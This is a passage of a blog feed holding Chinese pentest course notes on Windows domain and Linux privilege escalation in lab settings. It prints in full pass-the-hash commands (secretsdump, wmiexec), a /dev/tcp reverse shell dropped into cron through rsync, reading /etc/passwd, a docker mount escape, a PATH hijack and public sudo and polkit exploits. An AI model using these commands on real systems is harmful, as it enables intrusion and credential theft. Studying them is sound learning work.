alt="image-20230425151025181"></p><h5 id="7、获取HASH："><a href="#7、获取HASH：" class="headerlink" title="7、获取HASH："></a>7、获取HASH：</h5><p>python3 secretsdump.py ‘xiaodi.local&#x2F;win-3c7ss32sq6r$@WIN-3C7SS32SQ6R.xiaodi.local’ -hashes :10e02bef2258ad9b239e2281a01827a4</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425151214180.png" alt="image-20230425151214180"></p><h5 id="8、利用HASH："><a href="#8、利用HASH：" class="headerlink" title="8、利用HASH："></a>8、利用HASH：</h5><p>python3 wmiexec.py xiaodi.local&#x2F;<a href="mailto:&#97;&#x64;&#109;&#105;&#110;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#111;&#x72;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#x31;&#46;&#49;&#x35;">&#97;&#x64;&#109;&#105;&#110;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#111;&#x72;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#x31;&#46;&#49;&#x35;</a> -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425151521600.png" alt="image-20230425151521600"></p><p>windows server2012域控的ip</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425151712836.png" alt="image-20230425151712836"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day105 权限提升-Linux系统&amp;Docker挂载&amp;Rsync未授权&amp;Sudo-CVE&amp;Polkit-CVE</title>
      <link href="/2023/04/17/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/"/>
      <url>/2023/04/17/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424164808411.png" alt="image-20230424164808411"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Linux提权-Rsync未授权访问覆盖</p><p>2、Linux提权-Docker组用户挂载目录</p><p>2、Linux提权-Sudo(CVE-2021-3156）</p><p>3、Linux提权-Polkit(CVE-2021-4034)</p><h3 id="系列内容："><a href="#系列内容：" class="headerlink" title="#系列内容："></a>#系列内容：</h3><p>内核，数据库，第三方服务，SUID&amp;GUID，定时任务，环境变量，SUDO，权限不当等</p><p>脏牛漏洞(CVE-2016-5195)</p><p>Dirty Pipe(CVE-2022-0847)</p><p>SUDO(CVE-2021-3156）</p><p>Polkit(CVE-2021-4034)</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-Linux-Rsync未授权访问覆盖-本地权限"><a href="#➢-Linux-Rsync未授权访问覆盖-本地权限" class="headerlink" title="➢ Linux-Rsync未授权访问覆盖-本地权限"></a>➢ Linux-Rsync未授权访问覆盖-本地权限</h4><h4 id="➢-Linux-Docker组用户挂载目录-本地权限"><a href="#➢-Linux-Docker组用户挂载目录-本地权限" class="headerlink" title="➢ Linux-Docker组用户挂载目录-本地权限"></a>➢ Linux-Docker组用户挂载目录-本地权限</h4><h4 id="➢-Linux-Sudo-CVE-2021-3156-本地权限"><a href="#➢-Linux-Sudo-CVE-2021-3156-本地权限" class="headerlink" title="➢ Linux-Sudo(CVE-2021-3156)-本地权限"></a>➢ Linux-Sudo(CVE-2021-3156)-本地权限</h4><h4 id="➢-Linux-Polkit-CVE-2021-4034-本地权限"><a href="#➢-Linux-Polkit-CVE-2021-4034-本地权限" class="headerlink" title="➢ Linux-Polkit(CVE-2021-4034)-本地权限"></a>➢ Linux-Polkit(CVE-2021-4034)-本地权限</h4></blockquote><h3 id="Rsync未授权访问覆盖-本地"><a href="#Rsync未授权访问覆盖-本地" class="headerlink" title="#Rsync未授权访问覆盖-本地"></a>#Rsync未授权访问覆盖-本地</h3><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424165850385.png" alt="image-20230424165850385"></p><h5 id="Rsync是linux下一款数据备份工具，默认开启873端口"><a href="#Rsync是linux下一款数据备份工具，默认开启873端口" class="headerlink" title="Rsync是linux下一款数据备份工具，默认开启873端口"></a>Rsync是linux下一款数据备份工具，默认开启<code>873</code>端口</h5><p><a href="https://vulhub.org/#/environments/rsync/common/">https://vulhub.org/#/environments/rsync/common/</a></p><h5 id="借助Linux默认计划任务调用-x2F-etc-x2F-cron-hourly，利用rsync连接覆盖"><a href="#借助Linux默认计划任务调用-x2F-etc-x2F-cron-hourly，利用rsync连接覆盖" class="headerlink" title="借助Linux默认计划任务调用&#x2F;etc&#x2F;cron.hourly，利用rsync连接覆盖"></a>借助Linux默认计划任务调用&#x2F;etc&#x2F;cron.hourly，利用rsync连接覆盖</h5><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424170559375.png" alt="image-20230424170559375"></p><h5 id="比如最开始这个计时文件里面会执行nc，下面尝试用上传同样的文件名的恶意文件覆盖它"><a href="#比如最开始这个计时文件里面会执行nc，下面尝试用上传同样的文件名的恶意文件覆盖它" class="headerlink" title="比如最开始这个计时文件里面会执行nc，下面尝试用上传同样的文件名的恶意文件覆盖它"></a>比如最开始这个计时文件里面会执行nc，下面尝试用上传同样的文件名的恶意文件覆盖它</h5><h5 id="这里的nc是15-37创建的"><a href="#这里的nc是15-37创建的" class="headerlink" title="这里的nc是15:37创建的"></a>这里的nc是15:37创建的</h5><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424170757729.png" alt="image-20230424170757729"></p><h5 id="提权过程："><a href="#提权过程：" class="headerlink" title="-提权过程："></a>-提权过程：</h5><h5 id="1、创建一个nc文件（vim-nc），内容"><a href="#1、创建一个nc文件（vim-nc），内容" class="headerlink" title="1、创建一个nc文件（vim nc），内容:"></a>1、创建一个nc文件（vim nc），内容:</h5><p>#!&#x2F;bin&#x2F;bash</p><p>&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;3333 0&gt;&amp;i</p><h5 id="2、赋予执行权限："><a href="#2、赋予执行权限：" class="headerlink" title="2、赋予执行权限："></a>2、赋予执行权限：</h5><p>chmod +x nc</p><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424170257143.png" alt="image-20230424170257143"></p><h5 id="3、上传此文件覆盖定时任务目录下"><a href="#3、上传此文件覆盖定时任务目录下" class="headerlink" title="3、上传此文件覆盖定时任务目录下"></a>3、上传此文件覆盖定时任务目录下</h5><p>rsync -av nc rsync:&#x2F;&#x2F;47.94.236.117:873&#x2F;src&#x2F;etc&#x2F;cron.hourly</p><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424170344696.png" alt="image-20230424170344696"></p><p>查看其目录发现已经上传，时间更新</p><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424170457513.png" alt="image-20230424170457513"></p><h5 id="4、进行nc-监听相应的端口，等待上线"><a href="#4、进行nc-监听相应的端口，等待上线" class="headerlink" title="4、进行nc 监听相应的端口，等待上线"></a>4、进行nc 监听相应的端口，等待上线</h5><p>nc -lvnp 3333</p><h5 id="5、还可以下载敏感文件"><a href="#5、还可以下载敏感文件" class="headerlink" title="5、还可以下载敏感文件"></a>5、还可以下载敏感文件</h5><p>rsync -av rsync:&#x2F;&#x2F;47.94.236.117:873&#x2F;src&#x2F;etc&#x2F;passwd .&#x2F;</p><h3 id="Linux-Docker组用户挂载目录-本地"><a href="#Linux-Docker组用户挂载目录-本地" class="headerlink" title="#Linux-Docker组用户挂载目录-本地"></a>#Linux-Docker组用户挂载目录-本地</h3><h5 id="普通用户在docker组，利用docker服务启动镜像挂载目录，从而来访问root目录、etc目录等敏感文件来进行权限提升。"><a href="#普通用户在docker组，利用docker服务启动镜像挂载目录，从而来访问root目录、etc目录等敏感文件来进行权限提升。" class="headerlink" title="普通用户在docker组，利用docker服务启动镜像挂载目录，从而来访问root目录、etc目录等敏感文件来进行权限提升。"></a>普通用户在docker组，利用docker服务启动镜像挂载目录，从而来访问root目录、etc目录等敏感文件来进行权限提升。</h5><h5 id="复现操作：创建用户归类目录，添加到docker组"><a href="#复现操作：创建用户归类目录，添加到docker组" class="headerlink" title="-复现操作：创建用户归类目录，添加到docker组"></a>-复现操作：创建用户归类目录，添加到docker组</h5><ul><li><p>useradd -d &#x2F;home&#x2F;test -m  test</p></li><li><p>passwd test</p></li><li><p>usermod -G docker test</p></li><li><p>newgrp docker</p></li></ul><h5 id="利用："><a href="#利用：" class="headerlink" title="-利用："></a>-利用：</h5><ul><li><h5 id="docker-run-v-x2F-root-x2F-mnt-it-alpine"><a href="#docker-run-v-x2F-root-x2F-mnt-it-alpine" class="headerlink" title="docker run -v &#x2F;root:&#x2F;mnt -it alpine"></a>docker run -v &#x2F;root:&#x2F;mnt -it alpine</h5></li></ul><h5 id="主要的作用是：从Docker上面下载alpine镜像，然后运行"><a href="#主要的作用是：从Docker上面下载alpine镜像，然后运行" class="headerlink" title="主要的作用是：从Docker上面下载alpine镜像，然后运行;"></a>主要的作用是：从Docker上面下载alpine镜像，然后运行;</h5><h5 id="v-将容器外部的目录-x2F-root挂载-复制-到容器内部的-x2F-mnt目录-这里两个目录可以随便，只要是属于root和docker下的），使用-it参数进入容器shell。"><a href="#v-将容器外部的目录-x2F-root挂载-复制-到容器内部的-x2F-mnt目录-这里两个目录可以随便，只要是属于root和docker下的），使用-it参数进入容器shell。" class="headerlink" title="-v 将容器外部的目录&#x2F;root挂载(复制)到容器内部的&#x2F;mnt目录(这里两个目录可以随便，只要是属于root和docker下的），使用-it参数进入容器shell。"></a>-v 将容器外部的目录&#x2F;root挂载(复制)到容器内部的&#x2F;mnt目录(这里两个目录可以随便，只要是属于root和docker下的），使用-it参数进入容器shell。</h5><h6 id="groups-用户名-，查看用户所属组发现test是docker组"><a href="#groups-用户名-，查看用户所属组发现test是docker组" class="headerlink" title="groups 用户名 ，查看用户所属组发现test是docker组"></a>groups 用户名 ，查看用户所属组发现test是docker组</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425010019424.png" alt="image-20230425010019424"></p><h6 id="用不属于docker组的用户开启docker时，会显示拒绝"><a href="#用不属于docker组的用户开启docker时，会显示拒绝" class="headerlink" title="用不属于docker组的用户开启docker时，会显示拒绝"></a>用不属于docker组的用户开启docker时，会显示拒绝</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425010224434.png" alt="image-20230425010224434"></p><h6 id="输入提权命令docker-run-v-x2F-root-x2F-mnt-it-alpine，获得root权限，提权成功"><a href="#输入提权命令docker-run-v-x2F-root-x2F-mnt-it-alpine，获得root权限，提权成功" class="headerlink" title="输入提权命令docker run -v &#x2F;root:&#x2F;mnt -it alpine，获得root权限，提权成功"></a>输入提权命令docker run -v &#x2F;root:&#x2F;mnt -it alpine，获得root权限，提权成功</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425010632068.png" alt="image-20230425010632068"></p><h3 id="Linux-Sudo-CVE-2021-3156-本地权限"><a href="#Linux-Sudo-CVE-2021-3156-本地权限" class="headerlink" title="#Linux-Sudo(CVE-2021-3156)-本地权限"></a>#Linux-Sudo(CVE-2021-3156)-本地权限</h3><p>SUDO(CVE-2021-3156）</p><blockquote><p>影响版本：</p><p>sudo: 1.8.2 - 1.8.31p2</p><p>sudo: 1.9.0 - 1.9.5p1</p></blockquote><h5 id="判断："><a href="#判断：" class="headerlink" title="-判断："></a>-判断：</h5><h5 id="1、sudo-–version查看版本"><a href="#1、sudo-–version查看版本" class="headerlink" title="1、sudo –version查看版本"></a>1、sudo –version查看版本</h5><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425011813187.png" alt="image-20230425011813187"></p><h5 id="2、sudoedit-s-x2F-（如果存在报错就有漏洞，没有报错就没漏洞）"><a href="#2、sudoedit-s-x2F-（如果存在报错就有漏洞，没有报错就没漏洞）" class="headerlink" title="2、sudoedit -s &#x2F; （如果存在报错就有漏洞，没有报错就没漏洞）"></a>2、sudoedit -s &#x2F; （如果存在报错就有漏洞，没有报错就没漏洞）</h5><h6 id="不报错："><a href="#不报错：" class="headerlink" title="不报错："></a>不报错：</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425011630706.png" alt="image-20230425011630706"></p><h6 id="报错："><a href="#报错：" class="headerlink" title="报错："></a>报错：</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425012003176.png" alt="image-20230425012003176"></p><h5 id="利用：-1"><a href="#利用：-1" class="headerlink" title="-利用："></a>-利用：</h5><ul><li>git clone <a href="https://github.com/blasty/CVE-2021-3156.git">https://github.com/blasty/CVE-2021-3156.git</a> （exp）</li><li>cd CVE-2021-3156</li><li>make （编译）</li><li>chmod a+x sudo-hax-me-a-sandwich</li><li>.&#x2F;sudo-hax-me-a-sandwich 1</li></ul><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425013404478.png" alt="image-20230425013404478"></p><h3 id="Linux-Polkit-CVE-2021-4034-本地权限"><a href="#Linux-Polkit-CVE-2021-4034-本地权限" class="headerlink" title="#Linux-Polkit(CVE-2021-4034)-本地权限"></a>#Linux-Polkit(CVE-2021-4034)-本地权限</h3><p>Polkit(CVE-2021-4034)</p><p>漏洞影响2009年5月至今的所有polkit版本</p><p>由于polkit是系统预装工具，所有存在polkit的linux系统均受影响</p><p>如：CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等</p><h5 id="判断：dpkg-l-policykit-1"><a href="#判断：dpkg-l-policykit-1" class="headerlink" title="-判断：dpkg -l policykit-1"></a>-判断：dpkg -l policykit-1</h5><h6 id="有安装"><a href="#有安装" class="headerlink" title="有安装"></a>有安装</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425112230276.png" alt="image-20230425112230276"></p><h6 id="未安装"><a href="#未安装" class="headerlink" title="未安装"></a>未安装</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425112302133.png" alt="image-20230425112302133"></p><h6 id="当提示找不到这个命令的情况下也可以尝试，也可能有漏洞"><a href="#当提示找不到这个命令的情况下也可以尝试，也可能有漏洞" class="headerlink" title="当提示找不到这个命令的情况下也可以尝试，也可能有漏洞"></a>当提示找不到这个命令的情况下也可以尝试，也可能有漏洞</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425114309859.png" alt="image-20230425114309859"></p><h5 id="利用：-2"><a href="#利用：-2" class="headerlink" title="-利用："></a>-利用：</h5><ul><li>git clone <a href="https://github.com/berdav/CVE-2021-4034.git">https://github.com/berdav/CVE-2021-4034.git</a></li><li>cd CVE-2021-4034&#x2F;</li><li>make</li><li>.&#x2F;cve-2021-4034</li></ul><h6 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425111601435.png" alt="image-20230425111601435"></p><h6 id="返回root权限"><a href="#返回root权限" class="headerlink" title="返回root权限"></a>返回root权限</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425111701988.png" alt="image-20230425111701988"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day104 权限提升-Linux系统&amp;环境变量&amp;定时任务&amp;权限配置不当&amp;MDUT自动化</title>
      <link href="/2023/04/17/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
      <url>/2023/04/17/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423165324164.png" alt="image-20230423165324164"></p><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424164713514.png" alt="image-20230424164713514"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Linux提权-定时任务</p><p>2、Linux提权-环境变量</p><p>3、Linux提权-权限配置不当</p><p>4、Linux提权-数据库自动化</p><h3 id="系列内容："><a href="#系列内容：" class="headerlink" title="#系列内容："></a>#系列内容：</h3><p>内核，数据库，第三方服务，SUID&amp;GUID，定时任务，环境变量，SUDO，权限不当等</p><p>脏牛漏洞(CVE-2016-5195)</p><p>Dirty Pipe(CVE-2022-0847)</p><p>SUDO(CVE-2021-3156）</p><p>Polkit(CVE-2021-4034)</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a><strong>演示案例：</strong></h3><h4 id="➢-Linux-环境变量文件配合SUID-本地"><a href="#➢-Linux-环境变量文件配合SUID-本地" class="headerlink" title="➢ Linux-环境变量文件配合SUID-本地"></a><strong>➢ Linux-环境变量文件配合SUID-本地</strong></h4><h4 id="➢-Linux-定时任务打包配合SUID-本地"><a href="#➢-Linux-定时任务打包配合SUID-本地" class="headerlink" title="➢ Linux-定时任务打包配合SUID-本地"></a><strong>➢ Linux-定时任务打包配合SUID-本地</strong></h4><h4 id="➢-Linux-定时任务文件权限配置不当-WEB-amp-本地"><a href="#➢-Linux-定时任务文件权限配置不当-WEB-amp-本地" class="headerlink" title="➢ Linux-定时任务文件权限配置不当-WEB&amp;本地"></a><strong>➢ Linux-定时任务文件权限配置不当-WEB&amp;本地</strong></h4><h4 id="➢-Linux-第三方软件MYSQL数据库提权-WEB-amp-本地"><a href="#➢-Linux-第三方软件MYSQL数据库提权-WEB-amp-本地" class="headerlink" title="➢ Linux-第三方软件MYSQL数据库提权-WEB&amp;本地"></a><strong>➢ Linux-第三方软件MYSQL数据库提权-WEB&amp;本地</strong></h4></blockquote><h3 id="Linux-环境变量文件配合SUID-本地"><a href="#Linux-环境变量文件配合SUID-本地" class="headerlink" title="#Linux-环境变量文件配合SUID-本地"></a>#Linux-环境变量文件配合SUID-本地</h3><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423170947506.png" alt="image-20230423170947506"></p><h5 id="条件：ROOT用户对某个第三方程序给予了SUID权限"><a href="#条件：ROOT用户对某个第三方程序给予了SUID权限" class="headerlink" title="条件：ROOT用户对某个第三方程序给予了SUID权限"></a>条件：ROOT用户对某个第三方程序给予了SUID权限</h5><h5 id="探针具有suid权限的：find-x2F-user-root-perm-4000-print-2-gt-x2F-dev-x2F-null"><a href="#探针具有suid权限的：find-x2F-user-root-perm-4000-print-2-gt-x2F-dev-x2F-null" class="headerlink" title="探针具有suid权限的：find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null"></a>探针具有suid权限的：find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</h5><h5 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h5><h5 id="1、root用户讲可执行文件进行编译，保证文件的正常授权运行，给予ROOT权限执行"><a href="#1、root用户讲可执行文件进行编译，保证文件的正常授权运行，给予ROOT权限执行" class="headerlink" title="1、root用户讲可执行文件进行编译，保证文件的正常授权运行，给予ROOT权限执行"></a>1、root用户讲可执行文件进行编译，保证文件的正常授权运行，给予ROOT权限执行</h5><ul><li>gcc demo.c -o shell</li><li>chmod u+s shell</li></ul><h5 id="2、普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限"><a href="#2、普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限" class="headerlink" title="2、普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限"></a>2、普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限</h5><ul><li><p>cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;ps</p></li><li><p>export PATH&#x3D;&#x2F;tmp:$PATH</p></li><li><h5 id="（export-PATH-tmp-PATH-实际上是将-tmp-目录添加到-PATH-的最前面。这意味着，当你执行某个命令时，系统会先在-tmp-目录中查找对应的可执行文件，如果找不到再继续在-PATH-的其他目录中查找，-PATH是其他的环境变量目录）"><a href="#（export-PATH-tmp-PATH-实际上是将-tmp-目录添加到-PATH-的最前面。这意味着，当你执行某个命令时，系统会先在-tmp-目录中查找对应的可执行文件，如果找不到再继续在-PATH-的其他目录中查找，-PATH是其他的环境变量目录）" class="headerlink" title="（export PATH=/tmp:$PATH 实际上是将 /tmp 目录添加到 $PATH 的最前面。这意味着，当你执行某个命令时，系统会先在 /tmp 目录中查找对应的可执行文件，如果找不到再继续在 $PATH 的其他目录中查找，$PATH是其他的环境变量目录）"></a><strong><code>（export PATH=/tmp:$PATH 实际上是将 /tmp 目录添加到 $PATH 的最前面。这意味着，当你执行某个命令时，系统会先在 /tmp 目录中查找对应的可执行文件，如果找不到再继续在 $PATH 的其他目录中查找，$PATH是其他的环境变量目录）</code></strong></h5></li><li><p>.&#x2F;shell</p></li><li><p>id</p></li></ul><h6 id="比如有个domo-c文件，内容是用系统命令执行ps"><a href="#比如有个domo-c文件，内容是用系统命令执行ps" class="headerlink" title="比如有个domo.c文件，内容是用系统命令执行ps"></a>比如有个domo.c文件，内容是用系统命令执行ps</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423171102217.png" alt="image-20230423171102217"></p><h6 id="当系统执行ps时间，会默认执行bash下的ps"><a href="#当系统执行ps时间，会默认执行bash下的ps" class="headerlink" title="当系统执行ps时间，会默认执行bash下的ps"></a>当系统执行ps时间，会默认执行bash下的ps</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423172539332.png" alt="image-20230423172539332"></p><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423172028460.png" alt="image-20230423172028460"></p><h6 id="执行ps和执行bash-x2F-ps是一样的意思"><a 